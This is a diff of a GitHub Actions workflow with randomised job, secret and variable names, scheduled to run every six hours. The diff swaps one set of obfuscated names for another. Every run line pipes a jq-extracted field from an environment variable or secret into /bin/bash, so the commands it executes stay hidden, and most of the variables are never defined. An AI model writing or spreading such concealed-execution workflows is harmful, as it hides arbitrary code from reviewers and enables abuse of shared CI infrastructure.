@@ -1,36 +1,24 @@
 name: gantingxi3810
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '7 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gantingxi3810
         env:
-          uaea24: ${{ secrets.uaea24 }}
+          djsak7451: ${{ secrets.djsak7451 }}
         run: |
-          echo $uaea24 | jq -r .fb31666 | /bin/bash
-          echo $mgiwh359 | jq -r .z16 | /bin/bash
-          echo $ts91 | jq -r .kizx9780 | /bin/bash
-          echo $skjh185 | jq -r .pw3 | /bin/bash
-          echo $hyay966 | jq -r .wsv09 | /bin/bash
-          echo $ca842 | jq -r .pl29794 | /bin/bash
-          echo $bxs41199 | jq -r .ei571 | /bin/bash
-          echo $wi6649 | jq -r .n28 | /bin/bash
-          echo $cmn5658 | jq -r .vcgr09 | /bin/bash
-          echo $gsnod82185 | jq -r .phgh2299 | /bin/bash
-          echo $lug1220 | jq -r .zxq2 | /bin/bash
-          echo $oodt5024 | jq -r .jqp89863 | /bin/bash
-          echo $xa35045 | jq -r .i0564 | /bin/bash
-          echo $m178 | jq -r .qzbwo89850 | /bin/bash
-          echo $citso0804 | jq -r .hcjiu79 | /bin/bash
-          echo $di556 | jq -r .hk964 | /bin/bash
-          echo $a3870 | jq -r .ra58301 | /bin/bash
-          echo $zs606 | jq -r .pv48615 | /bin/bash
-          echo $slkog28412 | jq -r .qiifu4 | /bin/bash
+          echo $djsak7451 | jq -r .crrbe16 | /bin/bash
+          echo $sfva1 | jq -r .w28 | /bin/bash
+          echo $b00 | jq -r .zp5 | /bin/bash
+          echo $grc154 | jq -r .nyqed1 | /bin/bash
+          echo $lqa7 | jq -r .c10 | /bin/bash
+          echo $w28 | jq -r .zh6 | /bin/bash
+          echo $b3769 | jq -r .q3 | /bin/bash
+          echo $zpqgb51274 | jq -r .nf89 | /bin/bash
+          echo $a64 | jq -r .hwk2299 | /bin/bash
 
